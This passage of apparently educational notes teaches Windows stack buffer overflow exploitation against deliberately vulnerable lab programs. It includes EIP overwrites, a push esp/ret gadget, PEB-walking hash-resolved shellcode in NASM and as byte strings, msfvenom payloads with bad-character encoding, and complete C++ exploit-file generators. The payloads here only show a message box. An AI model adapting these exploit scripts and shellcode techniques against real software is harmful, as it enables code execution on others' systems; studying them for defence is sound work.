OllyDbg, EIP is overwritten by letter A. If the input string can overwrite the EIP register, then the program has a buffer overflow vulnerability. A buffer overflow does not necessarily exist in every program. Even if it exists, it is not always exploitable. Exploitability depends on the environment, register states, memory layout, and operating system protections. In this example we are going to attack the vulnerable simplec001.exe from previous section (Notice that we use C++ in this example):1234567891011121314151617//File name: attack-simplec001.cpp#include &lt;string&gt;#include &lt;sstream&gt;#include &lt;cstdlib&gt;using namespace std;int main(int argc, char* argv[]) &#123; string simplec001(argv[1]); string buffer_overflow(40, &#x27;A&#x27;); ostringstream sout; sout &lt;&lt; &#x27;\\&quot;&#x27; &lt;&lt; simplec001 &lt;&lt; &quot;\\&quot; &quot; &lt;&lt; buffer_overflow; system(sout.str().c_str()); system(&quot;pause&quot;);&#125; 1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB Again, the input string length depends on OS. Here, we have been successfully overwritten EIP with letter B. Notice that the hexadecimal representation of letter B is `0x42` ## 2.5 - Basic Shellcode 1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC Here, we modified the value of both EBP and EIP. Notice that the hexadecimal representation of letter C is `0x43`. --- We obtain the opcodes with WinDbg: 10:000&gt; a Write assembly code. Press enter with empty command to exit.12377441b52 push esp77441b53 retn77441b54 Search 54 and c3 in msvcrt.dll(755f0000~756af000)10:000&gt; s 755f0000 756af000 54 c3 Hence, we can the value 75687448 to overwrite EIP. Consequently, CPU jumps to 75687448 and executes 54 c3 (push esp and ret). The following code is our attacking code:12345678910111213141516171819#include &lt;string&gt;#include &lt;sstream&gt;#include &lt;cstdlib&gt;using namespace std;int main(int argc, char* argv[]) &#123; string simplec001(argv[1]); string junk(32, &#x27;A&#x27;); string ebp(4, &#x27;B&#x27;); string eip(&quot;\\x48\\x74\\x68\\x75&quot;); // msvcert.dll 75687448, push esp # retn string insructions(&quot;\\xcc\\xcc\\xcc\\xcc&quot;); ostringstream sout; sout &lt;&lt; &#x27;\\&quot;&#x27; &lt;&lt; simplec001 &lt;&lt; &quot;\\&quot; &quot; &lt;&lt; buffer_overflow; system(sout.str().c_str()); system(&quot;pause&quot;);&#125; To avoiding the invalid address value in EBP: 123456789101112131415161718192021222324252627#include &lt;string&gt;#include &lt;sstream&gt;#include &lt;cstdlib&gt;using namespace std;int main(int argc, char* argv[]) &#123; string simplec001(argv[1]); string junk(32, &#x27;A&#x27;); string ebp(4, &#x27;B&#x27;); string eip(&quot;\\x48\\x74\\x68\\x75&quot;); // msvcert.dll 75687448, push esp # retn string instructions; instructions += &quot;\\xc7\\xc5\\x77\\x77\\x77\\x77&quot; // MOV, EBP, 0x77777777 &quot;\\xc7\\xc1\\xdf\\x89\\x16\\x77&quot; // MOV ECX,0X771689DF &quot;\\x33\\xe9&quot; // XOR EBP,ECX &quot;\\xc7\\xc0\\x77\\x77\\x77\\x77&quot; // MOV EAX, 0x77777777 &quot;\\xc7\\xc1\\x2b\\x62\\x37\\x77&quot; // MOV ECX,0x7737622B &quot;\\x33\\xc1\\x42&quot; // XOR EAX, ECX # INC EDX &quot;\\xff\\xe0\\x42&quot;; // JMP EAX # INC EDX ostringstream sout; sout &lt;&lt; &#x27;\\&quot;&#x27; &lt;&lt; simplec001 &lt;&lt; &quot;\\&quot; &quot; &lt;&lt; junk &lt;&lt; ebp &lt;&lt; eip &lt;&lt; instructions; system(sout.str().c_str()); system(&quot;pause&quot;);&#125; Chapter 3 - Change the Action of a Program3.2 - From C Language to Shellcode1234567#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123; printf(&quot;Hello, World\\n&quot;); exit(0); &#125; Convert “Hello, World!\\n” into hexadecimal format:123&gt; python&gt;&gt;&gt; &quot;Hello, World!\\n&quot;.encode(&#x27;utf-8&#x27;).hex()&#x27;48656c6c6f2c20576f726c64210a&#x27;123448 65 6C 6C6F 2C 20 576F 72 6C 6421 0AAssembly code:12345PUSH 0x210A0000PUSH 0x6F2C2057PUSH 0x6F726C64PUSH 0x48656C6CPUSH ESPBecause little-endian is used in memory, the addresses must be reversed. Completed code:1234567891011PUSH 0x00000A21PUSH 0x646C726FPUSH 0x57202C6FPUSH 0x6C6C6548PUSH ESPMOV ECX,0x75669E20 ; Load 75669E20 into ECX. This is the address of printf()CALL ECX ; Call printf()XOR EAX,EAX ; Load 0 into EAXPUSH EAX ; Load 0 into [ESP] for exit()MOV ECX,0x75656690 ; Load 75656690 into ECX. This is the address of exit()CALL ECX ; Call exit() 3.3 - Using Plugin to Obtain ShellcodeWe use mona and Immunity Debugger to obtain the hexadecimal shellcode. https://github.com/corelan/mona 1!mona assemble -s PUSH 0x00000A21 # PUSH 0x646C726F # PUSH 0x57202C6F # PUSH 0x6C6C6548 # PUSH ESP # MOV ECX,0x75669E20 # CALL ECX # XOR EAX,EAX # PUSH EAX # # MOV ECX,0x75656690 # CALL ECX 12Full opcode:\\x68\\x21\\x0a\\x00\\x00\\x68\\x6f\\x72\\x6c\\x64\\x68\\x6f\\x2c\\x20\\x57\\x68\\x48\\x65\\x6c\\x6c\\x54\\xc7\\xc1\\x20\\x9e\\x66\\x75\\xff\\xd1\\x33\\xc0\\x50\\xc7\\xc1\\x90\\x66\\x65\\x75\\xff\\xd1 1234567891011121314151617181920212223242526//TestShellcode.cpp#include &lt;cstdio&gt;using namespace std;char shellcode[] =&quot;\\x68\\x21\\x0a\\x00\\x00&quot; //PUSH 0x00000A21&quot;\\x68\\x6f\\x72\\x6c\\x64&quot; //PUSH 0x646C726F&quot;\\x68\\x6f\\x2c\\x20\\x57&quot; //PUSH 0x57202C6F&quot;\\x68\\x48\\x65\\x6c\\x6c&quot; //PUSH 0x6C6C6548&quot;\\x54&quot; //PUSH ESP&quot;\\xc7\\xc1\\x20\\x9e\\x66\\x75&quot; //MOV ECX,0x75669E20&quot;\\xff\\xd1&quot; //CALL ECX &quot;\\x33\\xc0&quot; //XOR EAX,EAX&quot;\\x50&quot; //PUSH EAX &quot;\\xc7\\xc1\\x90\\x66\\x65\\x75&quot; //MOV ECX,0x75656690&quot;\\xff\\xd1&quot;; //CALL ECX typedef void (*FUNCPTR) ();int main() &#123; printf(&quot;Starting to execute shellcode:\\n&quot;); FUNCPTR fp = (FUNCPTR)shellcode; fp(); printf(&quot;This line will not be displayed since we call exit()&quot;);&#125; 3.4 - Using nasm_shell.rb from Metasploit to Obtain Shellcode https://github.com/fishstiqz/nasmshell 3.5 - Using NASM to Obtain Shellcode123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990//fonReadbin.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;iomanip&gt;using namespace std;typedef vector&lt;unsigned char&gt; BinaryArray;void usage();bool read_binary(ifstream&amp;, BinaryArray&amp;);unsigned output_hex(BinaryArray const&amp;, unsigned const);int main(int argc, char* argv[]) &#123; if (argc &lt; 2) &#123; usage(); return -1; &#125; ifstream fin(argv[1], ios_base::binary); if (!fin) &#123; cerr &lt;&lt; &quot;failed to open file\\&quot;&quot; &lt;&lt; argv[1] &lt;&lt; &quot;\\&quot;.\\n&quot;; return -1; &#125; BinaryArray array; if (!read_binary(fin, array)) &#123; cerr &lt;&lt; &quot;failed to parsed file \\&quot;&quot; &lt;&lt; argv[1] &lt;&lt; &quot;\\&quot;.\\n&quot;; return -1; &#125; unsigned count_per_line = 16; if (argc &gt;= 3) count_per_line = atoi(argv[2]); cout &lt;&lt; &quot;//Read \\&quot;&quot; &lt;&lt; argv[1] &lt;&lt; &quot;\\&quot;\\n&quot; &lt;&lt; &quot;//Size: &quot; &lt;&lt; array.size() &lt;&lt; &quot; bytes\\n&quot; &lt;&lt; &quot;//Count per line: &quot; &lt;&lt; count_per_line &lt;&lt; &quot;\\n&quot;; unsigned null_count = output_hex(array, count_per_line); cout &lt;&lt; &quot;//NULL count: &quot; &lt;&lt; null_count &lt;&lt; &#x27;\\n&#x27;;&#125;unsigned output_hex(BinaryArray const &amp;carr, unsigned const cpl) &#123; unsigned null = 0; cout &lt;&lt; &quot;char code[] = \\n\\&quot;&quot;; for (size_t i = 1; i &lt;= carr.size(); ++i) &#123; cout &lt;&lt; &quot;\\\\x&quot; &lt;&lt; hex &lt;&lt; setw(2) &lt;&lt; setfill(&#x27;0&#x27;) &lt;&lt; (unsigned)(carr[i-1]); if (!(i % cpl)) &#123; cout &lt;&lt; &quot;\\&quot;\\n&quot;; if (i &lt; carr.size()) cout &lt;&lt; &#x27;\\&quot;&#x27;; &#125; if (!(carr[i-1])) ++null; &#125; if (carr.size() % cpl) cout &lt;&lt; &#x27;\\&quot;&#x27;; cout &lt;&lt; &quot;;\\n&quot;; return null;&#125;bool read_binary(ifstream&amp; fin, BinaryArray&amp; arr) &#123; try &#123; unsigned file_length; fin.seekg(0, ios::end); file_length = fin.tellg(); fin.seekg(0, ios::beg); arr.resize(file_length); char *mem_buf = new char[file_length]; fin.read(mem_buf, file_length); copy(mem_buf, mem_buf + file_length, arr.begin()); delete[] mem_buf; &#125; catch (...) &#123; return false; &#125; return true;&#125;void usage() &#123; cout &lt;&lt; &quot;Usage: fonReadbin &lt;asm_bin_file&gt; [count_per_line=16]\\n&quot; &lt;&lt; &quot;Read binary data from the file and output the hex string for C/C++\\n&quot; &lt;&lt; &quot;Version: 1.0\\n&quot; &lt;&lt; &quot;Example: ./fonReadBin shellcode.asm 32&quot;;&#125; 3.6 - Review the First ShellcodeMostly, a PE file which compiled with Dev-C++ loads msvcrt.dll. On Windows XP, a PE file typically have a fixed ImageBase.However, starting from Windows Vista, ASLR randomizes the ImageBase. Obtain the ImageBase Address of kernel32.dll via PEB \\begin{align*} FS + 0x00 &= \\&\\_TEB\\\\ &= \\&(\\_TEB.NtTib)\\\\ &= \\&(\\_TEB.NtTib.ExceptionList)\\\\ FS + 0x18 &= \\&(\\_TEB.NtTib.Self)\\\\ &= \\&(\\&(\\_TEB.NtTib))\\\\ &= \\&(\\&(\\_TEB))\\\\ FS + 0x30 &= \\&(\\_TEB.ProcessEnvironmentBlock)\\\\ &= \\&(\\&(\\_PEB)) \\end{align*}These three expresions are equivalent to: \\begin{align*} *(FS+0x00) &= \\_TEB\\\\ &=\\_TEB.NtTib\\\\ &=\\_TEB.NtTib.ExceptionList\\\\ *(FS+0x18) &= \\_TEB.NtTib.Self\\\\ &=(\\_TEB.NtTib)\\\\ &=(\\_TEB)\\\\ *(FS+0x30) &= \\_TEB.ProcessEnvironmentBlock\\\\ &= \\&(\\_PEB) \\end{align*} 12345678910111213int main()&#123; __try &#123; int i = 0; &#125; __except(1) &#123; int j = 1; &#125; return 0;&#125; This code has assembly codes like this:12345678PUSH EBPMOV EBP,ESPPUSH FFPUSH 00404000PUSH 00401140MOV EAX,FS:[00000000]PUSH EAXMOV DWORD PTR FS:[00000000],ESP We can rewrite the relationship of FS and _TEB in form of FS:[Offset] \\begin{align*} FS:[0x00] &= \\_TEB\\\\ &=\\_TEB.NtTib\\\\ &=\\_TEB.NtTib.ExceptionList\\\\ FS:[0x18] &= \\_TEB.NtTib.Self\\\\ &=(\\_TEB.NtTib)\\\\ &=(\\_TEB)\\\\ FS:[0x30] &= \\_TEB.ProcessEnvironmentBlock\\\\ &= \\&(\\_PEB) \\end{align*} 10:000&gt; dt ntdll!_CLIENT_ID 10:000&gt; dt ntdll!_PEB_LDR_DATA 10:000&gt; !peb 10:000&gt; dt ntdll!_PEB_LDR_DATA 774b5da0 10:000&gt; dt ntdll!_PEB_LDR_DATA 774b5dbc 774b5da0 + 0x01c = 774b5dbc 10:000&gt; dl 774b5dbc Obtain LoadLibraryA() from the ImageBase of kernel32.dll10:000&gt; lm 10:000&gt; db 75540000 10:000&gt; dt _IMAGE_DOS_HEADER 10:000&gt; dd (75540000+0x03c) 10:000&gt; dd (75540000+0x03c) l1 10:000&gt; dt ntdll!_IMAGE_OPTIONAL_HEADER (75540000+0xe8+0x18) 10:000&gt; dt ntdll!_IMAGE_DATA_DIRECTORY (75540000+0xe8+0x18+0x60) So, the absolute address of in its virtual memory is: \\begin{align*} Absolute Virtual Address (VA) &= RVA + ImageBase\\\\ &= 0x75540000 + 0x93920\\\\ &= 0x755d3920 \\end{align*} 123456789101112131415typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals;&#125; IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h To obtain the data of NumberofNames, AddressOfFunctions, AddressofNames and AddressOfNameOrdinals. We have to calculate the virtual addresses using the offsets: \\text{Given: ImageBase = 0x75540000. Therefore:}\\\\ \\begin{align*} \\text{VA of NumberOfNames} &= Size(DWORD) \\times 5 + Size(WORD) \\times 2\\\\ &= Size(WORD) \\times 2 \\times 5 + Size(WORD) \\times 2\\\\ &= Size(WORD) \\times 12\\\\ &= Size(unsigned short) \\times 2 \\times 12\\\\ &= 24_{10} \\enspace bytes\\\\ &= 18_{16} (\\text{or 0x18}) \\enspace bytes\\\\ \\\\ \\text{VA of AddressOfFunctions} &= \\text{VA of NumberOfNames} + Size(DWORD)\\\\ &= \\text{0x18} + \\text{0x4 bytes}\\\\ &= \\text{0x1c bytes}\\\\ \\\\ \\text{VA of AddressOfNames} &= \\text{VA of AddressOfFunctions} + Size(DWORD)\\\\ &= \\text{0x1c + 0x4 bytes}\\\\ &= \\text{0x20 bytes}\\\\ \\\\ \\text{VA of AddressOfNameOrdinals} &= \\text{VA of AddressOfNames} + Size(DWORD)\\\\ &= \\text{0x20 + 0x4 bytes}\\\\ &= \\text{0x24 bytes}\\\\ \\end{align*}12340:000&gt; dd (75540000+0x93920+0x18) l10:000&gt; dd (75540000+0x93920+0x1c) l10:000&gt; dd (75540000+0x93920+0x20) l10:000&gt; dd (75540000+0x93920+0x24) l1 Thus, the addresses of the arrays are: \\begin{align*} Functions &= \\text{75540000 + 0x3948}\\\\ Names &= \\text{75540000 + 0x95270}\\\\ Ordinals &= \\text{75540000 + 0x96b98} \\end{align*}123db (0x75540000+0x3948) l40db (0x75540000+0x95270) l40db (0x75540000+0x96b98) l40 10:000&gt; da (75540000+0x097898) The Hash Value of a Function123extern char *c;unsigned h = 0;while (*c) h = ((h&lt;&lt;5) | (h&gt;&gt;27))+*c++; 123456789101112compute_hash: xor edi, edi xor eax, eax cldcompute_hash_again: lodsb test al, al jz compute_hash_finished ror edi, 0xd add edi, eax jmp compute_hash_againcompute_hash_finished: 123extern char *c;unsigned h = 0;whle (*c) h=((h&lt;19) | (h&gt;&gt;3))+*c++; cld: clear direction-flag.lodsb: Loads a byte, word, or doubleword from the source operand into the AL, AX, or EAX register, respectively.ror: rotate right. 123456789101112131415161718192021222324252627282930313233343536373839404142//fonSimpleHash.cpp#include &lt;iostream&gt;#include &lt;iomanip&gt;#include &lt;string&gt;using namespace std;unsigned const ROTATE_CONSTANT = 13;unsigned hash(string const &amp;s) &#123; char const *c = s.c_str(); unsigned h = 0; while (*c) h = ((h&lt;&lt;(32-ROTATE_CONSTANT)) | (h&gt;&gt;ROTATE_CONSTANT))+*c++; return h;&#125;unsigned little_endian(unsigned h) &#123; return (h&lt;&lt;24) | (h&lt;&lt;8 &amp; 0x00FF0000) | (h&gt;&gt;8 &amp; 0x0000FF00) | (h&gt;&gt;24);&#125;void usage() &#123; cout &lt;&lt; &quot;Usage: fonsimplehash &lt;Function Name&gt; [Funtion Name #2 #3 ...]\\n&quot; &lt;&lt; &quot;Output hash values for input function names\\n&quot; &lt;&lt; &quot;Version 1.0\\n&quot; &lt;&lt; &quot;Example1: ./fonsimplehash LoadLibraryA\\n&quot; &lt;&lt; &quot;Example2: ./fonsimplehash LoadLibraryA WinExec ExitThread\\n&quot; &lt;&lt; &quot;Or you can put function names in a text file, ex: names.txt,\\n&quot; &quot; one function name per line, and try ./fonsimplehash &lt; names.txt\\n&quot;;&#125;int main(int argc, char* argv[]) &#123; if (argc &lt;= 1) usage(); else &#123; cout &lt;&lt; left &lt;&lt; setw(24) &lt;&lt; &quot;Function Name&quot; &lt;&lt; setw(12) &lt;&lt; &quot;Hash Value&quot; &lt;&lt; &#x27;\\n&#x27; &lt;&lt; setw(24) &lt;&lt; &quot;---------&quot; &lt;&lt; setw(12) &lt;&lt; &quot;-----------&quot; &lt;&lt; &#x27;\\n&#x27;; for (int i = 1; i &lt; argc; ++i) &#123; cout &lt;&lt; setw(24) &lt;&lt; argv[i] &lt;&lt; hex &lt;&lt; setw(12) &lt;&lt; little_endian(hash(argv[i])) &lt;&lt; &#x27;\\n&#x27;; &#125; &#125;&#125; The completed shellcode:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990[Section .text][BITS 32]global _start_start: jmp KERNEL32_BASEFIND_FUNCTION: pushad mov ebp,[esp+0x24] mov eax,[ebp+0x3c] mov edx,[ebp+eax+0x78] add edx,ebp mov ecx,[edx+0x18] mov ebx,[edx+0x20] add ebx,ebpFIND_FUNCTION_LOOP: jecxz FIND_FUNCTION_END dec ecx mov esi,[ebx+ecx*4] add esi,ebpCOMPUTE_HASH: xor edi,edi xor eax,eax cldCOMPUTE_HASH_LOOP: lodsb test al,al jz COMPUTE_HASH_END ror edi,0xd add edi,eax jmp COMPUTE_HASH_LOOPCOMPUTE_HASH_END: cmp edi,[esp+0x28] jnz FIND_FUNCTION_LOOP mov ebx,[edx+0x24] add ebx,ebp mov cx,[ebx+ecx*2] mov ebx,[edx+0x1c] add ebx,ebp mov eax,[ebx+ecx*4] add eax,ebp mov [esp+0x1c],eaxFIND_FUNCTION_END: popad retKERNEL32_BASE: xor eax,eax mov ebx,[fs:eax+0x30] mov ebx,[ebx+0x0c] add ebx,0x1cKERNEL32_BASE_NEXT_MODULE: mov ebx,[ebx] mov ecx,[ebx+0x08] mov edx,[ebx+0x20] cmp [edx+0x18],al jne KERNEL32_BASE_NEXT_MODULE push 0xec0e4e48 push ecx call FIND_FUNCTION push 0x00006c6c push 0x642e7472 push 0x6376736d push esp call eax push 0xd5a73c1e push eax call FIND_FUNCTION mov ecx,eax mov DWORD [esp+0x04],0xcd481e74 call FIND_FUNCTION mov edx,eax push 0x00000A21 push 0x646C726F push 0x57202C6F push 0x6C6C6548 mov esi,esp xor eax,eax push eax push edx push esi call ecx pop edx pop edx call edx 12345678910111213141516171819202122232425262728#include &lt;cstdio&gt;using namespace std;char shellcode[] =&quot;\\xeb\\x4e\\x60\\x8b\\x6c\\x24\\x24\\x8b\\x45\\x3c\\x8b\\x54\\x05\\x78\\x01\\xea&quot;&quot;\\x8b\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\\x34\\x49\\x8b\\x34\\x8b\\x01\\xee&quot;&quot;\\x31\\xff\\x31\\xc0\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1\\xcf\\x0d\\x01\\xc7\\xeb&quot;&quot;\\xf4\\x3b\\x7c\\x24\\x28\\x75\\xe1\\x8b\\x5a\\x24\\x01\\xeb\\x66\\x8b\\x0c\\x4b&quot;&quot;\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01\\xe8\\x89\\x44\\x24\\x1c\\x61\\xc3&quot;&quot;\\x31\\xc0\\x64\\x8b\\x58\\x30\\x8b\\x5b\\x0c\\x83\\xc3\\x1c\\x8b\\x1b\\x8b\\x4b&quot;&quot;\\x08\\x8b\\x53\\x20\\x38\\x42\\x18\\x75\\xf3\\x68\\x48\\x4e\\x0e\\xec\\x51\\xe8&quot;&quot;\\x8e\\xff\\xff\\xff\\x68\\x6c\\x6c\\x00\\x00\\x68\\x72\\x74\\x2e\\x64\\x68\\x6d&quot;&quot;\\x73\\x76\\x63\\x54\\xff\\xd0\\x68\\x1e\\x3c\\xa7\\xd5\\x50\\xe8\\x71\\xff\\xff&quot;&quot;\\xff\\x89\\xc1\\xc7\\x44\\x24\\x04\\x74\\x1e\\x48\\xcd\\xe8\\x62\\xff\\xff\\xff&quot;&quot;\\x89\\xc2\\x68\\x21\\x0a\\x00\\x00\\x68\\x6f\\x72\\x6c\\x64\\x68\\x6f\\x2c\\x20&quot;&quot;\\x57\\x68\\x48\\x65\\x6c\\x6c\\x89\\xe6\\x31\\xc0\\x50\\x52\\x56\\xff\\xd1\\x5a&quot;&quot;\\x5a\\xff\\xd2&quot;;//NULL count: 4typedef void (*FUNCPTR) ();int main() &#123; printf(&quot;Starting to execute shellcode:\\n&quot;); FUNCPTR fp = (FUNCPTR)shellcode; fp(); printf(&quot;This line will not be displayed since we call exit()&quot;);&#125; 3.7 - Metasploit Payload——Hello World! MessageBox()3.8 - The differences of Windows Operating Systems, x32 and x64Chapter 4 - Practical Attack4.1 - Different Operating Systems and CompilersDEP stands for Data Execution Prevention. ASLR stands for Address Space Layout Randomization. 4.2 - Example: C Language123456789101112131415161718192021222324252627//vulnerable001.c//filename: vulnerable001.c#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;void do_something(FILE *pfile) &#123; char buf[128]; fscanf(pfile, &quot;%s&quot;, buf); //do file reading and parsing below //...&#125;int main(int argc, char* argv[]) &#123; char dummp[1024]; FILE *pfile; printf(&quot;Vulnerable001 starts...&quot;); if (argc&gt;=2) pfile = fopen(argv[1], &quot;r&quot;); if (pfile) do_something(pfile); printf(&quot;Vulnerable001 ends...\\n&quot;); return 0;&#125; 12345678910111213141516171819//attack-vulnerable001.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;#define FILENAME &quot;Vulnerable001_Exploit.txt&quot;int main() &#123; string junk(140, &#x27;A&#x27;); string eip(&quot;\\xEF\\xBE\\xAD\\xDE&quot;); string padding(&quot;BBBBCCCCDDDDEEEEFFFFGGGG&quot;); ofstream fout(FILENAME, ios::binary); fout &lt;&lt; junk &lt;&lt; eip &lt;&lt; padding; cout &lt;&lt; &quot;Attack file: &quot; &lt;&lt; FILENAME &lt;&lt; &quot;\\nOK&quot;;&#125; We can use Immunity Debugger to find the opcode of PUSH ESP # RETN:1!mona jmp -r esp Here we can use the address 0x7c874f13 (or others you want). Then our attack program is:12345678910111213141516171819//attack-vulnerable001.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;#define FILENAME &quot;Vulnerable001_Exploit.txt&quot;int main() &#123; string junk(140, &#x27;A&#x27;); string eip(&quot;\\x13\\x4f\\x87\\x7c&quot;); //0x7c874f13, little-endian string shellcode(&quot;\\xcc\\xcc\\xcc\\xcc&quot;); //shellcode ofstream fout(FILENAME, ios::binary); fout &lt;&lt; junk &lt;&lt; eip &lt;&lt; shellcode; cout &lt;&lt; &quot;Attack file: &quot; &lt;&lt; FILENAME &lt;&lt; &quot;OK&quot;;&#125; Generate shellcode with msfvenom (msfpayload is used in this book. However, it has been deprecated and replaced by msfvenom). 1kali$ msfvenom -p windows/messagebox TEXT=&quot;Hello world&quot; TITLE=&quot;BOF Test&quot; -f c Attack script:1234567891011121314151617181920212223242526272829303132333435363738//attack-vulnerable001.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;#define FILENAME &quot;Vulnerable001_Exploit.txt&quot;char buf[] = &quot;\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52&quot;&quot;\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x0f\\xb7\\x4a\\x26\\x8b\\x72\\x28&quot;&quot;\\x31\\xff\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d&quot;&quot;\\x01\\xc7\\x49\\x75\\xef\\x52\\x8b\\x52\\x10\\x57\\x8b\\x42\\x3c\\x01&quot;&quot;\\xd0\\x8b\\x40\\x78\\x85\\xc0\\x74\\x4c\\x01\\xd0\\x8b\\x58\\x20\\x8b&quot;&quot;\\x48\\x18\\x01\\xd3\\x50\\x85\\xc9\\x74\\x3c\\x49\\x8b\\x34\\x8b\\x31&quot;&quot;\\xff\\x01\\xd6\\x31\\xc0\\xc1\\xcf\\x0d\\xac\\x01\\xc7\\x38\\xe0\\x75&quot;&quot;\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe0\\x58\\x8b\\x58\\x24\\x01&quot;&quot;\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01&quot;&quot;\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58&quot;&quot;\\x5f\\x5a\\x8b\\x12\\xe9\\x80\\xff\\xff\\xff\\x5d\\xe8\\x0b\\x00\\x00&quot;&quot;\\x00\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x00\\x68\\x4c&quot;&quot;\\x77\\x26\\x07\\xff\\xd5\\x6a\\x00\\xe8\\x09\\x00\\x00\\x00\\x42\\x4f&quot;&quot;\\x46\\x20\\x54\\x65\\x73\\x74\\x00\\xe8\\x0c\\x00\\x00\\x00\\x48\\x65&quot;&quot;\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64\\x00\\x6a\\x00\\x68\\x45&quot;&quot;\\x83\\x56\\x07\\xff\\xd5\\x6a\\x00\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5&quot;;int main() &#123; string junk(140, &#x27;A&#x27;); string eip(&quot;\\x13\\x4f\\x87\\x7c&quot;); //0x7c874f13, little-endian string debug(&quot;\\xcc\\xcc\\xcc\\xcc&quot;); string shellcode(buf); //shellcode ofstream fout(FILENAME, ios::binary); fout &lt;&lt; junk &lt;&lt; eip &lt;&lt; debug &lt;&lt; shellcode; cout &lt;&lt; &quot;Attack file: &quot; &lt;&lt; FILENAME &lt;&lt; &quot;\\nOK&quot;;&#125;Normally, we will be failed. The reason is our shellcode contains a null character (\\x00). Now, lets solve this problem with msfvenom:1msfvenom -p windows/messagebox TEXT=&quot;Hello world&quot; TITLE=&quot;BOF Test&quot; -f c -b &#x27;\\x0c\\x0d\\x20\\x1a\\x00\\x0a\\x0b&#x27; Final attack script:1234567891011121314151617181920212223242526272829303132333435363738394041//attack-vulnerable001.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;#define FILENAME &quot;Vulnerable001_Exploit.txt&quot;char buf[] = &quot;\\xb8\\xd7\\x13\\x93\\x1c\\xda\\xc3\\xd9\\x74\\x24\\xf4\\x5a\\x31\\xc9&quot;&quot;\\xb1\\x39\\x31\\x42\\x12\\x03\\x42\\x12\\x83\\x15\\x17\\x71\\xe9\\x65&quot;&quot;\\xf0\\xfa\\x12\\x95\\x01\\x65\\x9a\\x70\\x30\\xb7\\xf8\\xf1\\x61\\x07&quot;&quot;\\x8a\\x57\\x8a\\xec\\xde\\x43\\x9d\\x45\\x94\\x4d\\x2a\\xdb\\x01\\xa0&quot;&quot;\\xd3\\x2d\\x92\\x6e\\x17\\x2f\\x6e\\x6c\\x44\\x8f\\x4f\\xbf\\x99\\xce&quot;&quot;\\x88\\x76\\xd7\\x3f\\x44\\xdf\\x9c\\x92\\x79\\x54\\xe0\\x2e\\x7b\\xba&quot;&quot;\\x6e\\x0e\\x03\\xbf\\xb1\\xfb\\xbf\\xbe\\xe1\\x8f\\x08\\xd8\\x8a\\xc8&quot;&quot;\\xa8\\xd9\\x5f\\xb8\\x2d\\x10\\x2b\\x05\\x67\\x93\\x2b\\xfe\\x43\\x58&quot;&quot;\\xd2\\xd7\\x9d\\x9e\\x79\\x16\\x12\\x13\\x83\\x5e\\x95\\xcb\\xf6\\x94&quot;&quot;\\xe5\\x76\\x01\\x6f\\x97\\xac\\x84\\x70\\x3f\\x27\\x3e\\x55\\xc1\\xe4&quot;&quot;\\xd9\\x1e\\xcd\\x41\\xad\\x79\\xd2\\x54\\x62\\xf2\\xee\\xdd\\x85\\xd5&quot;&quot;\\x66\\xa5\\xa1\\xf1\\x23\\x7e\\xcb\\xa0\\x89\\xd1\\xf4\\xb3\\x76\\x8e&quot;&quot;\\x50\\xbf\\x95\\xd9\\xe5\\x40\\x66\\xe6\\xbb\\x56\\x92\\x18\\x44\\xa7&quot;&quot;\\xd0\\x6b\\x21\\xd5\\x29\\xb9\\x87\\x7d\\x22\\xd1\\xd7\\x15\\xf6\\x5e&quot;&quot;\\xfe\\xe2\\xf9\\x75\\x94\\xec\\xed\\x7c\\x69\\xed\\xed\\x3c\\x26\\xab&quot;&quot;\\xcd\\x94\\xdd\\x40\\x7a\\x14\\xf6\\xab\\x82\\x14\\x06\\xfc\\xe7\\x78&quot;&quot;\\x6a\\x93\\xc7\\xf7\\x1d\\x19\\x64\\x93\\xe1\\xb7\\x74\\x33\\xa7\\xc4&quot;&quot;\\x23\\xc4\\xd8\\x1e\\xa1\\xca\\x4e\\x51\\x83\\x68\\xd8\\x6e\\x39&quot;;int main() &#123; string junk(140, &#x27;A&#x27;); string eip(&quot;\\x13\\x4f\\x87\\x7c&quot;); //0x7c874f13, little-endian string debug(&quot;\\xcc\\xcc\\xcc\\xcc&quot;); string nops(8, &#x27;\\x90&#x27;); string shellcode(buf); //shellcode ofstream fout(FILENAME, ios::binary); fout &lt;&lt; junk &lt;&lt; eip &lt;&lt; nops &lt;&lt; shellcode; cout &lt;&lt; &quot;Attack file: &quot; &lt;&lt; FILENAME 